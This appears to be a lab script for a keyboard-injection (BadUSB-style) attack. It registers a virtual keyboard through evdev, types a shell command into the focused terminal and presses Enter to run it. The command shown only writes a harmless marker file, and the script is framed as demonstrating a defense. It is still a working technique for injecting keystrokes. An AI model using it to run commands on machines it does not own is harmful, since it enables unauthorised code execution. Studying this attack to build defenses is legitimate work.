#!/usr/bin/env/ python3
"""rogue_exec.py - rung 2: a rogue keyboard that RUNS a command, not just types. Drives a focused shell to write a harmless marker file. LAB only, own machine. The point: prove HID injection can execute - and prove the defense cuts it off."""

import time
from evdev import UInput, ecodes as e

# Each character maps to (keycode, needs_shift).
KEYMAP = {}
for c in "abcdefghijklmnopqrstuvwxyz":
    KEYMAP[c] = (e.ecodes[f"KEY_{c.upper()}"], False)
KEYMAP[" "] = (e.KEY_SPACE, False)
KEYMAP["/"] = (e.KEY_7, True) #Turkish-Q: Shift+7 = /
KEYMAP["."] = (e.KEY_SLASH, False) #Turkish-Q: the pysichal /-key gives.
KEYMAP[">"] = (e.KEY_102ND, True) #Turkish-Q: Shift + the ISO <> key = >

keycodes = [kc for (kc, shift) in KEYMAP.values()]
keycodes += [e.KEY_LEFTSHIFT, e.KEY_ENTER]

ui = UInput({e.EV_KEY: keycodes}, name="lab-rougue-exec")
print("[*] Virtual keyboard registered.")
time.sleep(2)

def tap(keycode, shift=False):
    if shift:
        ui.write(e.EV_KEY, e.KEY_LEFTSHIFT, 1)
    ui.write(e.EV_KEY, keycode, 1)
    ui.write(e.EV_KEY, keycode, 0)
    if shift:
        ui.write(e.EV_KEY, e.KEY_LEFTSHIFT,0)
    ui.syn()

command = "echo hello world > /tmp/labbadusb.txt"
print(f"[*] Injecting command: {command!r}")
for ch in command:
    keycode, shift = KEYMAP[ch]
    tap(keycode, shift)
    time.sleep(0.01)

tap(e.KEY_ENTER) #press Enter -this runs the command 
ui.close()
print("[*] Done")


